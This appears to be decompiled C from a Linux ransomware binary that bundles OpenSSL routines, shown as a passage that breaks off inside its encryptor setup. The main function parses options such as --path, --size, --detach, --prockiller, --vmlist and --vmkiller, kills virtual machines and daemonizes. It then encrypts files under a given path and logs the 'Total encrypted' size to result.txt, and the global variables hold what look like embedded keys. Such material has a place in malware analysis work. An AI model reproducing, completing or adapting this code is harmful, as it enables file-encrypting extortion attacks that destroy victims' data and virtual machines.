int64_t general_allocate_string(int64_t a1, int32_t a2, int64_t a3, int32_t a4, int32_t a5, int64_t a6);
int64_t get_error_values(int32_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t getrn(int64_t a1, int64_t a2, int64_t * a3);
int64_t HMAC(int64_t a1, int64_t a2, int64_t a3, int64_t * a4, int64_t a5, int64_t * a6, int64_t a7);
int64_t HMAC_CTX_cleanup(int64_t a1);
int64_t HMAC_CTX_init(int64_t * a1);
int64_t HMAC_Final(int64_t a1, int64_t * a2, int32_t a3);
int64_t HMAC_Init(int64_t * a1, char * a2, int64_t a3, int64_t a4, int64_t a5);
int64_t HMAC_Init_ex(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int32_t a5, int64_t a6);
int64_t HMAC_Update(int64_t a1);
int64_t impl_check(void);
int64_t int_ctx_new(int32_t a1, int64_t a2, int64_t a3);
int64_t internal_find(int64_t a1, int64_t a2, int64_t a3);
int64_t lh_doall_arg(int64_t a1, int64_t a2, int64_t * a3);
int64_t lh_new(int64_t a1, int64_t a2);
int64_t lh_retrieve(int64_t a1);
int64_t OBJ_bsearch_(int64_t * a1, int64_t * a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t OBJ_bsearch_ex_(int64_t a1, int64_t result2, int64_t a3, int64_t a4, int64_t a5, uint32_t a6);
int64_t OBJ_NAME_get(int64_t a1, int64_t a2);
int64_t OBJ_NAME_init(int64_t a1);
int64_t OPENSSL_cleanse(int64_t a1, int64_t a2);
int64_t OPENSSL_init(void);
int64_t OPENSSL_init_library(void);
int64_t OPENSSL_showfatal(char * a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t OpenSSLDie(char * a1, int64_t a2, char * a3);
int64_t PEM_ASN1_read_bio(int64_t a1, char * a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t PEM_bytes_read_bio(int64_t * a1, int64_t * a2, int32_t a3, int64_t a4, int64_t a5, int64_t a6, int64_t a7);
int64_t pem_check_suffix(int64_t str, char * str2);
int64_t PEM_def_callback(int64_t * str2, int64_t a2, uint32_t a3, int64_t str);
int64_t PEM_do_header(int64_t * a1, int64_t a2, int64_t * a3, int64_t a4, int64_t a5);
int64_t PEM_get_EVP_CIPHER_INFO(int64_t a1, int64_t * a2);
int64_t PEM_read_bio(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5);
int64_t PEM_read_bio_RSAPublicKey(int64_t a1, int64_t a2, int64_t a3, int64_t a4);
int64_t pkey_set_type(int64_t a1, uint32_t a2, int64_t a3, int64_t a4);
int64_t private_AES_set_encrypt_key(void);
int64_t RAND_init_fips(void);
int64_t RAND_set_rand_method(int32_t a1);
int64_t RSA_free(int64_t a1);
int64_t RSA_get_default_method(void);
int64_t RSA_new(int64_t a1);
int64_t RSA_new_method(int32_t a1);
int64_t RSA_PKCS1_SSLeay(void);
int64_t RSA_private_decrypt(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int32_t a5);
int64_t RSA_public_encrypt(int64_t a1, int64_t * a2, int64_t * a3, int64_t a4, int64_t a5);
int64_t RSA_size(int64_t a1);
int64_t RSA_up_ref(int64_t a1);
int64_t sk_find(int64_t a1, int32_t a2, int64_t a3, int64_t a4);
int64_t sk_free(int64_t a1);
int64_t sk_insert(int64_t a1, int64_t a2, uint32_t a3);
int64_t sk_new(int32_t a1);
int64_t sk_new_null(int64_t a1);
int64_t sk_num(int64_t a1);
int64_t sk_pop_free(int64_t a1, int64_t a2);
int64_t sk_push(int64_t a1, int64_t a2, int64_t a3, int64_t a4);
int64_t sk_set(int64_t a1, int64_t a2, int64_t result);
int64_t sk_sort(int64_t nmemb);
int64_t sk_value(int64_t a1, int64_t a2);
int64_t UI_add_input_string(int64_t a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t UI_add_verify_string(int64_t a1, int64_t a2, int32_t a3, int64_t * a4, int64_t a5, int64_t a6, int64_t a7);
int64_t UI_free(int64_t a1);
int64_t UI_get_default_method(void);
int64_t UI_new(int64_t a1);
int64_t UI_new_method(int32_t a1);
int64_t UI_OpenSSL(void);
int64_t UI_process(int64_t a1);
int64_t verify_checksums(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 0x2e2e002e; // 0x4e49fa
char * g2; // 0x4f08e0
int32_t * g3 = (int32_t *)-0x98c0300098c04; // 0x4f1500
int32_t g4 = 419; // 0x4f3a20
int64_t g5 = 0x52d9bc890000002c; // 0x4f3c60
int64_t g6 = 0x101b219208884671; // 0x4f3d40
int64_t g7 = -0x614adf0a9556bfcd; // 0x4f3d60
int64_t g8 = -0x2b6d41ee94aab7e6; // 0x4f3d80
int64_t g9 = -0x4c67fb0c8a5a39ae; // 0x4f3da0
int64_t g10 = -0x3358c41614db9691; // 0x4f3dc0
int64_t g11 = 0x251e6ee371e2a77; // 0x4f3de0
int64_t g12 = -0x1ab61f960b1f76dd; // 0x4f3e20
int64_t g13 = -0x19bf08232ff2fa4d; // 0x4f3e40
int64_t g14 = 0x12e2da1ca106bd51; // 0x4f3e60
int64_t g15 = 0x22a53afa22eeecae; // 0x4f3ea0
int64_t g16 = 2; // 0x4f3fa0
int64_t g17 = -0x349d472e76cfb4f4; // 0x4f3fb0
char * g18 = "\xa0\x39\x11w\x9a\xc1\x30\x1f\xbeH\xa7\xaa\xa0\x84Td\xad\x1bp\xfa\x13Uc\xd2\x1f\x62\x32\x93\x8e\xc9>\t\xa7\x64\xe4\x12n\x1b\xf2\x92;\xb9\xcbV\xea\a\x88\xb5\xa6\xbc\x16\x1f'\xfe\xd8\xaa@\xb2\xb0-7v\xa6\xa4\x82,\x0e\"d\x9d\xcb\xd1"; // 0x4f3fe0
int64_t g19 = 0x35ac063fba0cb9a1; // 0x4f6140
int64_t g20 = -0x39a62583ee0851b1; // 0x4f6160
int64_t g21 = -0x72c3b24e6a315415; // 0x4f6170
int64_t g22 = 0x5a8db93cb4e88a77; // 0x4f6180
int64_t g23 = 0xe3a948dc561a61e; // 0x4f61a0
int64_t g24 = -0x2db5b9d8d9260753; // 0x4f61e0
int64_t g25 = -0x1eea7d32ad1512d2; // 0x4f6200
int64_t g26 = -0xa5c31091d2f5535; // 0x4f6220
int32_t g27 = 0x571fbcee; // 0x4f6240
int32_t g28 = 0x683eaa99; // 0x4f6260
int32_t g29 = -0x313cdcb3; // 0x4f6270
int64_t g30 = 0xe2dc35b05876ef5; // 0x4f6280
int64_t g31 = -0x781bd5d9effa4599; // 0x4f6290
int64_t g32 = 0x7c0e4ca8134426f7; // 0x4f62a0
int32_t g33 = -0x51f64f32; // 0x4f62b0
int32_t g34 = -0x3bbcbf8a; // 0x4f62c8
int32_t g35 = 0x7fdd806e; // 0x4f62e0
int64_t g36 = 0x7f7de119f975d2c8; // 0x4f6300
int64_t g37 = -0x48332bbae31029d3; // 0x4f6320
int64_t g38 = 0x748ee429823d0f8a; // 0x4f6330
int64_t g39 = 0x7766554433221100; // 0x4f6370
int64_t g40 = 0x30047b6ad8e0c469; // 0x4f6380
int64_t g41 = -0x13e9fb5d0891b084; // 0x4f63c0
int64_t g42 = 0; // 0x4f6400
int64_t g43 = 0x1cb4485d9bbf8f8f; // 0x4f6418
int64_t g44 = 0x1beaa26cd3e58c59; // 0x4f6420
int64_t g45 = -0x1efcdab89674524; // 0x4f6428
int64_t g46 = -0x1032547698badcff; // 0x4f6440
int64_t g47 = -0x797d5f41ca4fdaef; // 0x4f6448
int32_t g48 = -0x3b49fc5; // 0x4f65a0
int32_t g49 = 0x5342d8a2; // 0x4f66a0
int32_t g50 = 0x97b1c2; // 0x4f67a0
int32_t g51 = -0x19ca1ef; // 0x4f68a0
int32_t g52 = -0x610e92cb; // 0x4f69a0
int32_t g53 = 0x568280c2; // 0x4f6aa0
int32_t g54 = 0x169301b4; // 0x4f6ba0
int32_t g55 = 0x5199da38; // 0x4f6ca0
int32_t g56 = 0x1ec90299; // 0x4f6da0
int32_t g57 = 0x7843833f; // 0x4f6ea0
int64_t g58 = 0x43db909d6dd5c900; // 0x4f6fa0
int64_t g59 = -0x7cf5a1e86e3e69dd; // 0x4f70c0
int64_t g60 = 0x174211bb1d238300; // 0x4f7160
int64_t g61 = -0x566e13f12fed2986; // 0x4f7200
int64_t g62 = -0x11f996f684413400; // 0x4f72a0
int64_t g63 = 0x31fce166e5cfc00; // 0x4f7340
int64_t g64 = -0x5824e4064ec2d8ca; // 0x4f73e0
int64_t g65 = 0x7370696600010001; // 0x4f74e1
int64_t g66 = 0x301faee12a5948fa; // 0x4f7500
char * g67 = "\xf7&\xd8\x98G\x91h[\x9e\x39\xb2X\xbbu\xbf\x01\x17\f\x84"; // 0x4f7520
int64_t g68 = -0x4816bee762ca2ec9; // 0x4f7540
char * g69 = "\x11\x13\xc4\x19\xed+\x1d\x16\x11\xeb\x9b\xbe\xf0\x7f\xcf\x44\x8b\xd7W\xbd\x8d\xa9%\xb0G%\xd6l\x9aT\x7f\x8f\vS\x1a\x10h2\x03\x38\x82\xc4\x87\xc4\xea\x0e\xd1\x04\xa9\x98\xc1\x05\xa3\xf3\xf8\xb1\xaf\xbc\xd9x~\xee=C"; // 0x4f7560
char * g70; // 0x4f75a0
int64_t g71 = 0; // 0x4f7654
char * g72 = "\xda\x39\xa3\xee^kK\r2U\xbf\xef\x95`\x18\x90\xaf\xd8\a\t\xa9\x99>6G\x06\x81j\xba>%qxP\xc2l\x9c\xd0\xd8\x9d\x84\x98>D\x1c;\xd2n\xba\xaeJ\xa1\xf9Q)\xe5\xe5\x46p\xf1\x44SA SHA256"; // 0x4f7660
int64_t g73 = 0x728d3ffdd87853a8; // 0x4f76c0
int64_t g74 = -0x1c5b0aafb1fb882e; // 0x4f77c0
int64_t g75 = 0x6541d21fe254d713; // 0x4f77e0
int64_t g76 = -0x352a6141330caddc; // 0x4f78e0
int64_t g77 = -0x349d472e76cfb4f4; // 0x4f79e0
char * g78; // 0x4fa658
int32_t g79 = 0x1e498; // 0x500000
int64_t g80 = 0x436460; // 0x7224e0
int64_t g81 = 0x43df90; // 0x722940
int32_t g82 = 0; // 0x72c120
int32_t g83 = 0; // 0x72c1a0
int32_t * g84 = (int32_t *)715; // 0x72e720
int64_t g85 = 0x800000021; // 0x72f2a0
int64_t g86 = 0x800000020; // 0x72f300
int64_t g87 = 0x100000293; // 0x72f360
int64_t g88 = 0x100000292; // 0x72f3c0
int64_t g89 = 0x10000003f; // 0x72f420
int64_t g90 = 0x10000003d; // 0x72f480
int64_t g91 = 0x80000002c; // 0x72f4e0
int64_t g92 = 0x10000003e; // 0x72f540
int64_t g93 = 0x10000003c; // 0x72f5a0
int64_t g94 = 0x80000002b; // 0x72f600
int64_t g95 = 0x100000386; // 0x72f660
int64_t g96 = 0x100000386; // 0x72f6c0
int64_t g97 = 0x100000383; // 0x72f720
int64_t g98 = 0x100000383; // 0x72f780
int64_t g99 = 0x100000380; // 0x72f7e0
int64_t g100 = 0x100000380; // 0x72f840
int64_t g101 = 0x100000392; // 0x72f8a0
int64_t g102 = 0x100000392; // 0x72f900
int64_t g103 = 0x100000391; // 0x72f960
int64_t g104 = 0x100000391; // 0x72f9c0
int64_t g105 = 0x100000385; // 0x72fa20
int64_t g106 = 0x100000385; // 0x72fa80
int64_t g107 = 0x100000382; // 0x72fae0
int64_t g108 = 0x100000382; // 0x72fb40
int64_t g109 = 0x10000037f; // 0x72fba0
int64_t g110 = 0x10000037f; // 0x72fc00
int64_t g111 = 0x10000038a; // 0x72fc60
int64_t g112 = 0x10000038a; // 0x72fcc0
int64_t g113 = 0x10000028f; // 0x72fd20
int64_t g114 = 0x10000028f; // 0x72fd80
int64_t g115 = 0x10000028c; // 0x72fde0
int64_t g116 = 0x10000028c; // 0x72fe40
int64_t g117 = 0x1000001ad; // 0x72fea0
int64_t g118 = 0x1000001ad; // 0x72ff00
int64_t g119 = 0x1000001ac; // 0x72ff60
int64_t g120 = 0x1000001ac; // 0x72ffc0
int64_t g121 = 0x10000001aa; // 0x730020
int64_t g122 = 0x10000001aa; // 0x730080
int64_t g123 = 0x10000001ab; // 0x7300e0
int64_t g124 = 0x10000001ab; // 0x730140
int64_t g125 = 0x100000389; // 0x7301a0
int64_t g126 = 0x100000389; // 0x730200
int64_t g127 = 0x10000028e; // 0x730260
int64_t g128 = 0x10000028e; // 0x7302c0
int64_t g129 = 0x10000028b; // 0x730320
int64_t g130 = 0x10000028b; // 0x730380
int64_t g131 = 0x1000001a9; // 0x7303e0
int64_t g132 = 0x1000001a9; // 0x730440
int64_t g133 = 0x1000001a8; // 0x7304a0
int64_t g134 = 0x1000001a8; // 0x730500
int64_t g135 = 0x10000001a6; // 0x730560
int64_t g136 = 0x10000001a6; // 0x7305c0
int64_t g137 = 0x10000001a7; // 0x730620
int64_t g138 = 0x10000001a7; // 0x730680
int64_t g139 = 0x100000388; // 0x7306e0
int64_t g140 = 0x100000388; // 0x730740
int64_t g141 = 0x10000028d; // 0x7307a0
int64_t g142 = 0x10000028d; // 0x730800
int64_t g143 = 0x10000028a; // 0x730860
int64_t g144 = 0x10000028a; // 0x7308c0
int64_t g145 = 0x1000001a5; // 0x730920
int64_t g146 = 0x1000001a5; // 0x730980
int64_t g147 = 0x1000001a4; // 0x7309e0
int64_t g148 = 0x1000001a4; // 0x730a40
int64_t g149 = 0x10000001a2; // 0x730aa0
int64_t g150 = 0x10000001a2; // 0x730b00
int64_t g151 = 0x10000001a3; // 0x730b60
int64_t g152 = 0x10000001a3; // 0x730bc0
int64_t g153 = 0x43d300; // 0x7325c0
int64_t g154 = 0x29e000002a2; // 0x733160
int64_t g155 = 0x29d000002a1; // 0x7331e0
int64_t g156 = 0x29c000002a0; // 0x733260
int64_t g157 = 0x29f000002a3; // 0x7332e0
int64_t g158 = 0x4100000040; // 0x733360
int64_t g159 = 0x800000004; // 0x736880
int64_t g160 = 0x459020; // 0x737540
int64_t g161 = 0x459060; // 0x7376a0
int64_t g162 = 0x19600000001; // 0x737700
int64_t g163 = 0; // 0x739228
int32_t * g164 = NULL; // 0x7392f8
int64_t g165 = 0; // 0x7394d8
int32_t g167 = 0; // 0x7396c4
char g168 = 0; // 0x7396c7
int64_t g169 = 0; // 0x7396d8
int32_t * g170 = NULL; // 0x739760
int64_t g171 = 0; // 0x739868
int32_t g172 = 20; // 0x73ad80
int64_t g173 = 1025; // 0x73b5a0
int32_t g174 = 1; // 0x73b5f0
int32_t g175 = 906; // 0x73b5f4
int32_t * g176 = (int32_t *)0x38800000000; // 0x73bb00
int32_t g177 = 904; // 0x73bb04
int32_t g178 = 1; // 0x73cf30
int32_t g179 = 1; // 0x73cf34
int64_t g180 = 0x441a10; // 0x73cf80
char (*g181)[19] = "OpenSSL DSA method"; // 0x73cfe0
int64_t g182; // 0x73d3c0
int64_t g183 = 0x706050403020100; // 0x73d9c0
int32_t g184 = 415; // 0x73da00
int32_t g186 = 32; // 0x73da10
int32_t g188 = 32; // 0x73da20
int32_t g190 = 32; // 0x73da30
int32_t g192 = 32; // 0x73da40
int32_t g194 = 32; // 0x73da50
int32_t g196 = 32; // 0x73da60
int32_t g197 = 415; // 0x73da80
char (*g198)[12] = "ECDSA P-256"; // 0x73da88
int32_t g200 = 32; // 0x73da98
int32_t g202 = 32; // 0x73daa8
int32_t g204 = 32; // 0x73dab8
char (*g205)[24] = "Eric Young's PKCS#1 RSA"; // 0x73dae0
char (*g206)[18] = "OpenSSL DH Method"; // 0x73dba0
char (*g207)[31] = "OpenSSL default user interface"; // 0x73e300
int64_t g208 = 0x427260136d66b1f3; // 0x73e340
int64_t g209 = 0x62fa232a78beb3e6; // 0x73e360
int64_t g210 = 0x6e25d3620d78d815; // 0x73e390
int64_t g211 = -0x3e74967f170027c1; // 0x73e3c0
int64_t g212 = 0x2d21d8b66c06146d; // 0x73e400
int64_t g213 = -0x2a4f5ce213bec526; // 0x73e420
char (*g214)[20] = "OpenSSL ECDH method"; // 0x73e460
struct _IO_FILE * g215 = NULL; // 0x73e700
int64_t g216 = 0; // 0x73e720
int32_t g217 = 0; // 0x73e728
int64_t g218 = 0; // 0x73e730
char * g219; // 0x73e738
int64_t g220 = 0; // 0x73e740
int64_t g221 = 0; // 0x73e748
char g222 = 0; // 0x73e750
char g223 = 0; // 0x73e751
struct _IO_FILE * g224 = NULL; // 0x73e758
int64_t g225 = 0; // 0x73e760
int64_t g226 = 0; // 0x73e780
int64_t g227 = 0; // 0x73e790
int64_t g228 = 0; // 0x73e7b8
int64_t g229 = 0; // 0x73e7c0
int64_t g230 = 0; // 0x73e7e0
int64_t g231 = 0; // 0x73e800
int32_t g232 = 0; // 0x740340
int32_t g233 = 0; // 0x740360
int32_t g234 = 0; // 0x740364
int32_t g235 = 0; // 0x740368
int32_t g236 = 0; // 0x74036c
int32_t g237 = 0; // 0x740370
int64_t g238 = 0; // 0x740378
int64_t g239 = 0; // 0x740380
int32_t g240 = 0; // 0x740474
int32_t g241 = 0; // 0x740475
char * g242; // 0x740478
int64_t g243 = 0; // 0x740480
char * g244; // 0x740488
int64_t g245 = 0; // 0x740490
int64_t g246 = 0; // 0x740498
int64_t g247 = 0; // 0x7404a0
char * g248; // 0x7404a8
int64_t g249 = 0; // 0x7404c0
int32_t g250 = 0; // 0x740950
int32_t g251 = 0; // 0x740954
int64_t g252 = 0; // 0x740958
int64_t g253 = 0; // 0x740970
int64_t g254 = 0; // 0x740978
int64_t g255 = 0; // 0x740980
int64_t g256 = 0; // 0x740988
int64_t g257 = 0; // 0x740990
int64_t g258 = 0; // 0x740998
int64_t g259 = 0; // 0x7409a8
int64_t g260 = 0; // 0x7409c0
int64_t g261 = 0; // 0x7409d0
int32_t g262 = 0; // 0x7409f0
int32_t g263 = 0; // 0x740a08
int64_t g264 = 0; // 0x740a09
int64_t g265 = 0; // 0x740a10
int64_t g266 = 0; // 0x740a20
int32_t g267 = 0; // 0x740a30
int64_t g268 = 0; // 0x740a78
int64_t g269 = 0; // 0x740a80
int64_t g270 = 0; // 0x740a88
int64_t g271 = 0; // 0x740a90
int64_t g272 = 0; // 0x740a98
int64_t g273 = 0; // 0x740aa0
int64_t g274 = 0; // 0x740f48
int32_t g275 = 0; // 0x740f80
int32_t g276 = 0; // 0x740f84
int32_t g277 = 0; // 0x740f88
int32_t g278 = 0; // 0x740f8c
int64_t g279 = 0; // 0x740f90
int64_t g280 = 0; // 0x740fa8
int64_t g281 = 0; // 0x741080
int32_t g282 = 0; // 0x7410f0
int64_t g283 = 0; // 0x741100
int64_t g284 = 0; // 0x741108
int64_t g285 = 0; // 0x741110
int64_t g286 = 0; // 0x741118
char * g287; // 0x741120
int64_t g288 = 0; // 0x741188
int64_t g289 = 0; // 0x742520
int32_t g290 = 0; // 0x742540
int32_t g291 = 0; // 0x742544
int32_t g292 = 0; // 0x742548
int32_t g293 = 0; // 0x74254c
int32_t g294 = 0; // 0x742550
int64_t g295 = 0; // 0x742560
int64_t g296 = 0; // 0x742568
int32_t g297 = 0; // 0x742570
int64_t g298;
int32_t g299;
int64_t * g166 = (int64_t *)&g297; // 0x7396c0
int64_t * g185 = &g6; // 0x73da08
int64_t * g187 = &g7; // 0x73da18
int64_t * g189 = &g8; // 0x73da28
int64_t * g191 = &g9; // 0x73da38
int64_t * g193 = &g10; // 0x73da48
int64_t * g195 = &g11; // 0x73da58
int64_t * g199 = &g12; // 0x73da90
int64_t * g201 = &g13; // 0x73daa0
int64_t * g203 = &g14; // 0x73dab0

// ------------------------ Functions -------------------------

// Address range: 0x42e2c0 - 0x42e2c6
int64_t function_42e2c0(void) {
    // 0x42e2c0
    return __cxa_rethrow();
}

// Address range: 0x42e6b0 - 0x42e6b6
int64_t function_42e6b0(int64_t a1, int64_t a2, int64_t a3) {
    // 0x42e6b0
    return strcmp();
}

// Address range: 0x42e7c0 - 0x42e7c6
int64_t function_42e7c0(void) {
    // 0x42e7c0
    return __cxa_end_catch();
}

// Address range: 0x42e830 - 0x42e836
int64_t function_42e830(int64_t a1) {
    // 0x42e830
    return __cxa_begin_catch();
}

// Address range: 0x42eb40 - 0x42ebc5
// Demangled:     GetArg(int, char**, char const*)
int64_t _Z6GetArgiPPcPKc(int32_t a1, char ** a2, char * a3) {
    // 0x42eb40
    if (a1 >= 0 != a1 != 0) {
        // 0x42ebc3
        return 0;
    }
    int64_t v1 = (int64_t)a3;
    int32_t v2 = 0;
    int32_t v3 = v2 - a1; // 0x42ebb4
    int64_t result = 0; // 0x42ebbc
    while (v3 < 0 != ((v3 ^ v2) & (v2 ^ a1)) < 0) {
        int64_t v4 = 8 * (int64_t)v2 + (int64_t)a2;
        int32_t v5 = v2 + 1; // 0x42eb8f
        if (v5 < a1 == (int32_t)function_42e6b0(*(int64_t *)v4, v1, v1) == 0) {
            // 0x42eb97
            result = *(int64_t *)(v4 + 8);
            return result;
        }
        v2 = v5;
        v3 = v2 - a1;
        result = 0;
    }
  lab_0x42ebc3:
    // 0x42ebc3
    return result;
}

// Address range: 0x42ebc5 - 0x42ec30
// Demangled:     FindArg(int, char**, char const*)
int64_t _Z7FindArgiPPcPKc(int32_t a1, char ** a2, char * a3) {
    // 0x42ebc5
    if (a1 >= 0 != a1 != 0) {
        // 0x42ec2e
        return 0;
    }
    int32_t v1 = -a1; // 0x42ec1f
    if (v1 < 0 == (v1 & a1) < 0) {
        // 0x42ec2e
        return 0;
    }
    int64_t v2 = (int64_t)a3; // 0x42ebfe
    int32_t v3 = 0; // 0x42ec18
    int64_t v4 = *(int64_t *)(8 * (int64_t)v3 + (int64_t)a2); // 0x42ebfb
    int64_t result = 1; // 0x42ec0f
    while ((int32_t)function_42e6b0(v4, v2, v2) != 0) {
        // 0x42ec1c
        v3++;
        int32_t v5 = v3 - a1; // 0x42ec1f
        result = 0;
        if (v5 < 0 == ((v5 ^ v3) & (v3 ^ a1)) < 0) {
            // break -> 0x42ec2e
            break;
        }
        v4 = *(int64_t *)(8 * (int64_t)v3 + (int64_t)a2);
        result = 1;
    }
    // 0x42ec2e
    return result;
}

// Address range: 0x42ec30 - 0x42ed43
// Demangled:     humanSize(unsigned long, char*)
int64_t _ZL9humanSizemPc(uint64_t a1, char * str) {
    int64_t v1; // 0x42ec30
    int64_t v2; // 0x42ec30
    if ((int64_t)a1 < 0) {
        int128_t v3 = __asm_cvtsi2sd(a1 / 2 | a1 % 2); // 0x42ec8f
        __asm_movsd(__asm_addsd(v3, v3));
        goto lab_0x42ecb0;
    } else {
        // 0x42ec98
        v2 = 0;
        v1 = __asm_movsd(__asm_cvtsi2sd(a1));
        if (a1 < 1025) {
            goto lab_0x42ed1c;
        } else {
            goto lab_0x42ecb0;
        }
    }
  lab_0x42ecb0:;
    uint64_t v4 = a1;
    int128_t v5; // 0x42ec30
    int128_t v6; // 0x42eccc
    if (v4 < 0) {
        // 0x42ecc0
        v6 = __asm_cvtsi2sd(v4 / 2 | v4 % 2);
        v5 = __asm_addsd(v6, v6);
    } else {
        // 0x42ecb9
        v5 = __asm_cvtsi2sd(v4);
    }
    int64_t v7 = __asm_movsd(__asm_divsd(v5, __asm_movsd_22(0x4090000000000000))); // 0x42ece1
    uint32_t v8 = 1; // 0x42ece6
    int32_t v9 = v8; // 0x42ecfe
    int64_t v10 = v4 / 1024; // 0x42ecfe
    while (v4 > 0xfffff == v8 < 4) {
        // 0x42ecb0
        v4 = v10;
        if (v4 < 0) {
            // 0x42ecc0
            v6 = __asm_cvtsi2sd(v4 / 2 | v4 % 2);
            v5 = __asm_addsd(v6, v6);
        } else {
            // 0x42ecb9
            v5 = __asm_cvtsi2sd(v4);
        }
        // 0x42ecd5
        v7 = __asm_movsd(__asm_divsd(v5, __asm_movsd_22(0x4090000000000000)));
        v8 = v9 + 1;
        v9 = v8;
        v10 = v4 / 1024;
    }
    // 0x42ed1c
    v2 = 8 * (int64_t)v8;
    v1 = v7;
    goto lab_0x42ed1c;
  lab_0x42ed1c:;
    // 0x42ed1c
    int64_t v11; // bp-8, 0x42ec30
    int64_t v12 = *(int64_t *)((int64_t)&v11 - 64 + v2); // 0x42ed21
    int128_t v13 = __asm_movsd_22(v1); // 0x42ed26
    return sprintf(str, "%.02lf %s", (float64_t)(int64_t)v13, (char *)v12);
}

// Address range: 0x42ed43 - 0x42efe8
// Demangled:     HandleCommandLine(int, char**)
int64_t _Z17HandleCommandLineiPPc(uint32_t a1, char ** a2) {
    // 0x42ed43
    if ((char)_Z7FindArgiPPcPKc(a1, a2, "--path") == 0) {
        // 0x42edc6
        puts("parameter --path must be specified");
        exit(1);
        // UNREACHABLE
    }
    // 0x42ed84
    _Z7SetPathPKc((char *)_Z6GetArgiPPcPKc(a1, a2, "--path"));
    if ((char)_Z7FindArgiPPcPKc(a1, a2, "--file") != 0) {
        // 0x42edda
        _Z7SetFilePKc((char *)_Z6GetArgiPPcPKc(a1, a2, "--file"));
    }
    // 0x42ee00
    if ((char)_Z7FindArgiPPcPKc(a1, a2, "--size") == 0) {
        // 0x42eedd
        _Z7SetSizei(20);
    } else {
        uint32_t str_as_i = atoi((char *)_Z6GetArgiPPcPKc(a1, a2, "--size")); // 0x42ee3f
        g298 = str_as_i - 10;
        switch (str_as_i) {
            case 10: {
                // 0x42ee5e
                _Z7SetSizei(10);
                // break -> 0x42eee7
                break;
            }
            case 15: {
                // 0x42ee6a
                _Z7SetSizei(15);
                // break -> 0x42eee7
                break;
            }
            case 20: {
                // 0x42ee76
                _Z7SetSizei(20);
                // break -> 0x42eee7
                break;
            }
            case 25: {
                // 0x42ee82
                _Z7SetSizei(25);
                // break -> 0x42eee7
                break;
            }
            case 30: {
                // 0x42ee8e
                _Z7SetSizei(30);
                // break -> 0x42eee7
                break;
            }
            case 35: {
                // 0x42ee9a
                _Z7SetSizei(35);
                // break -> 0x42eee7
                break;
            }
            case 40: {
                // 0x42eea6
                _Z7SetSizei(40);
                // break -> 0x42eee7
                break;
            }
            case 50: {
                // 0x42eeb2
                _Z7SetSizei(50);
                // break -> 0x42eee7
                break;
            }
            default: {
                // 0x42eebf
                printf("paremeter --size cannot be %d\n", (int64_t)str_as_i);
                exit(1);
                // UNREACHABLE
            }
        }
    }
    // 0x42eee7
    if ((char)_Z7FindArgiPPcPKc(a1, a2, "--detach") == 0) {
        // 0x42ef0d
        _Z9SetDetachb(false);
    } else {
        // 0x42ef01
        _Z9SetDetachb(true);
    }
    // 0x42ef17
    if ((char)_Z7FindArgiPPcPKc(a1, a2, "--log") != 0) {
        // 0x42ef31
        _Z7LogInitPKc((char *)_Z6GetArgiPPcPKc(a1, a2, "--log"));
    }
    // 0x42ef57
    if ((char)_Z7FindArgiPPcPKc(a1, a2, "--prockiller") == 0) {
        // 0x42ef7d
        _Z13SetProcKillerb(false);
    } else {
        // 0x42ef71
        _Z13SetProcKillerb(true);
    }
    // 0x42ef87
    if ((char)_Z7FindArgiPPcPKc(a1, a2, "--vmlist") != 0) {
        // 0x42efa1
        _Z9SetVmListPKc((int64_t *)_Z6GetArgiPPcPKc(a1, a2, "--vmlist"), (int64_t *)a2, "--vmlist");
    }
    int64_t v1 = _Z7FindArgiPPcPKc(a1, a2, "--vmkiller"); // 0x42efd8
    int64_t result = v1; // 0x42efdf
    if ((char)v1 != 0) {
        // 0x42efe1
        result = _Z19KillVirtualMachinesv((int64_t)a1, (int64_t)a2, (int64_t)"--vmkiller");
    }
    // 0x42efe6
    return result;
}

// Address range: 0x42efe8 - 0x42f27e
int main(int argc, char ** argv) {
    // 0x42efe8
    _Z17HandleCommandLineiPPc((int32_t)argc, argv);
    if ((char)_Z9GetDetachv() == 0) {
        // 0x42f13b
        if ((char)_Z19InitializeEncryptorv() != 1) {
            // 0x42f147
            exit(1);
            // UNREACHABLE
        }
        // 0x42f151
        _ZNSaIcEC1Ev();
        int64_t v1; // bp-56, 0x42efe8
        _ZNSsC1EPKcRKSaIcE((char *)&v1, (int64_t *)_Z7GetPathv());
        int64_t v2; // bp-41, 0x42efe8
        _Z11SearchFilesSsPFvSsP4statE(&v1, 0x42ea64, (void (*)(int64_t, int64_t *))&v2);
        _ZNSsD1Ev();
        _ZNSaIcED1Ev();
        _Z8LogClosev();
    } else {
        int32_t v3 = fork(); // 0x42f027
        if (v3 != -1) {
            if (v3 != 0) {
                // 0x42f131
                exit(0);
                // UNREACHABLE
            }
            // 0x42f04e
            umask(0);
            setsid();
            chdir("/");
            close(0);
            close(1);
            close(2);
            if ((char)_Z19InitializeEncryptorv() != 1) {
                // 0x42f091
                exit(1);
                // UNREACHABLE
            }
            // 0x42f09b
            _ZNSaIcEC1Ev();
            int64_t v4; // bp-72, 0x42efe8
            _ZNSsC1EPKcRKSaIcE((char *)&v4, (int64_t *)_Z7GetPathv());
            int64_t v5; // bp-57, 0x42efe8
            _Z11SearchFilesSsPFvSsP4statE(&v4, 0x42ea64, (void (*)(int64_t, int64_t *))&v5);
            _ZNSsD1Ev();
            _ZNSaIcED1Ev();
            _Z8LogClosev();
        } else {
            // 0x42f035
            puts("fork() error.");
        }
    }
    struct _IO_FILE * file = fopen("result.txt", "a+"); // 0x42f1ec
    if (file != NULL) {
        // 0x42f1fc
        int64_t v6; // bp-328, 0x42efe8
        __asm_rep_stosq_memset((char *)&v6, 0, 32);
        _ZL9humanSizemPc(g216, (char *)&v6);
        fprintf(file, "Total encrypted: %s\n", &v6);
        fprintf(file, "Files: %d\n", (int64_t)g217);
        fclose(file);
    }
    // 0x42f274
    exit(0);
    return &g299;
}

// Address range: 0x42ffa5 - 0x430021
// Demangled:     InitializeEncryptor()
int64_t _Z19InitializeEncryptorv(void) {
    int64_t * mem = malloc((int32_t)&g79); // 0x42ffb2
    g219 = (char *)mem;
    int64_t result = 0; // 0x42ffc8
    if (mem != NULL) {
